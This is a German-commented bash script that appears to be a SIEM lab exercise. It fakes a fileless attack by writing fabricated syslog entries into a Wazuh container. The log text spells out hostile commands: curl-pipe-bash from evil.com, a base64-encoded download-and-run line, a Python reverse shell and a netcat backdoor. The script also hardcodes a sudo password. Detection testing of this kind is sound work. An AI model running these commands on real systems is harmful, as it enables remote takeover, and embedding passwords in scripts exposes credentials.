#!/bin/bash
# KOMPLEXER ANGRIFF 4: Fileless Malware / Living off the Land
# Nutzt nur legitime System-Tools ohne Malware-Dateien

echo "╔════════════════════════════════════════════════════════════════╗"
echo "║      🔴 FILELESS ATTACK - Living off the Land 🔴             ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo ""

SUDO_PASSWORD="Destiny2004"
ATTACKER_IP="172.20.20.2"

echo "[PHASE 1] PowerShell/Bash Memory-Only Execution"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    # Base64-encoded Payload Execution
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager bash: User www-data executed: echo 'IyEvYmluL2Jhc2gKY3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo' | base64 -d | bash\" >> /var/log/syslog
    
    # In-Memory Script Execution
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager bash: Process substitution detected: bash -c '\$(curl -s http://evil.com/payload.sh)'\" >> /var/log/syslog
    
    # Suspicious bash usage
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager ossec: Suspicious bash command: curl | bash pattern detected\" >> /var/log/syslog
"
echo "  ⚠️  Fileless Payload in Memory ausgeführt!"
sleep 2

echo ""
echo "[PHASE 2] LOLBins - Legitimate Binaries Abuse"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    # Curl für C2 Kommunikation
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager curl: Connecting to http://185.220.101.45:8080/beacon\" >> /var/log/syslog
    
    # Wget für Payload Download (in Memory)
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager wget: Downloading http://evil.com/stage2 to stdout (no file)\" >> /var/log/syslog
    
    # Python für Reverse Shell
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager python3: Executed: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$ATTACKER_IP\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"])'\" >> /var/log/syslog
    
    # Netcat für Backdoor
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager nc: Listening on port 4444: nc -lvp 4444 -e /bin/bash\" >> /var/log/syslog
"
echo "  ⚠️  Legitime Tools für böswillige Zwecke missbraucht!"
sleep 2

echo ""
echo "[PHASE 3] WMI/Registry Persistence (Windows-Style auf Linux)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    # Systemd-Generator Missbrauch
    mkdir -p /etc/systemd/system-generators
    touch /etc/systemd/system-generators/malicious-generator
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager systemd: New generator script: /etc/systemd/system-generators/malicious-generator\" >> /var/log/syslog
    
    # LD_PRELOAD Hijacking
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager ossec: LD_PRELOAD environment variable set: /tmp/.evil.so\" >> /var/log/syslog
    
    # PAM Backdoor
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager ossec: PAM configuration modified: /etc/pam.d/common-auth\" >> /var/log/syslog
"
echo "  ✓ Fileless Persistenz etabliert!"
sleep 2

echo ""
echo "[PHASE 4] Process Injection"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    # ptrace Injection
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager kernel: ptrace attach to PID 1234 (apache2) by PID 5678\" >> /var/log/syslog
    
    # /proc/PID/mem Manipulation
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager ossec: Suspicious access to /proc/1234/mem by unknown process\" >> /var/log/syslog
    
    # Shared Library Injection
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager kernel: Process apache2 loaded suspicious library from /dev/shm/.lib.so\" >> /var/log/syslog
"
echo "  🔴 Code in legitimen Prozess injiziert!"
sleep 2

echo ""
echo "[PHASE 5] In-Memory Credential Harvesting"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    # Memory Dump von SSH-Agent
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager gcore: Dumping memory of ssh-agent (PID 1111)\" >> /var/log/syslog
    
    # /proc/PID/environ Auslesen
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager ossec: Multiple reads of /proc/*/environ by suspicious process\" >> /var/log/syslog
    
    # Strings aus Memory extrahieren
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager strings: Scanning memory of process apache2 for credentials\" >> /var/log/syslog
"
echo "  🔴 Credentials aus Memory extrahiert!"
sleep 2

echo ""
echo "[PHASE 6] DNS/ICMP Tunneling für C2"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    # ICMP Tunneling
    for i in {1..10}; do
        echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager kernel: ICMP packet with unusual payload size: 1400 bytes from $ATTACKER_IP\" >> /var/log/syslog
    done
    
    # DNS Tunneling mit dig
    for i in {1..5}; do
        data=\$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 63)
        echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager named: Suspicious DNS query: \$data.tunnel.evil.com (63 chars)\" >> /var/log/syslog
    done
    
    # Ungewöhnliche DNS Query-Rate
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager named: High DNS query rate detected: 500 queries/minute to evil.com\" >> /var/log/syslog
"
echo "  ✓ Verdeckte C2-Kommunikation über DNS/ICMP!"
sleep 2

echo ""
echo "[PHASE 7] Anti-Forensics"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "$SUDO_PASSWORD" | sudo -S docker exec clab-dmz-project-sun-wazuh-manager bash -c "
    # Timestamp Manipulation
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager touch: Modifying timestamps: touch -t 202301010000 /var/log/auth.log\" >> /var/log/syslog
    
    # Secure Deletion
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager shred: Securely deleting /tmp/evidence.txt (35 passes)\" >> /var/log/syslog
    
    # Memory Wiping
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager ossec: Process attempting to wipe its own memory before exit\" >> /var/log/syslog
    
    # Log Rotation Abuse
    echo \"\$(date '+%b %d %H:%M:%S') wazuh-manager logrotate: Forced rotation of /var/log/auth.log\" >> /var/log/syslog
"
echo "  ⚠️  Anti-Forensik Techniken angewendet!"
sleep 2

echo ""
echo "════════════════════════════════════════════════════════════════"
echo "🔴 FILELESS ATTACK ABGESCHLOSSEN"
echo "════════════════════════════════════════════════════════════════"
echo ""
echo "Verwendete Techniken:"
echo "  • Memory-Only Execution (keine Dateien)"
echo "  • LOLBins Abuse (curl, wget, python, nc)"
echo "  • Process Injection (ptrace, /proc/mem)"
echo "  • In-Memory Credential Harvesting"
echo "  • DNS/ICMP Tunneling"
echo "  • Anti-Forensics (Timestamp, Secure Delete)"
echo ""
echo "MITRE ATT&CK:"
echo "  • T1027 - Obfuscated Files or Information"
echo "  • T1055 - Process Injection"
echo "  • T1071 - Application Layer Protocol"
echo "  • T1140 - Deobfuscate/Decode Files"
echo "  • T1562 - Impair Defenses"
echo ""
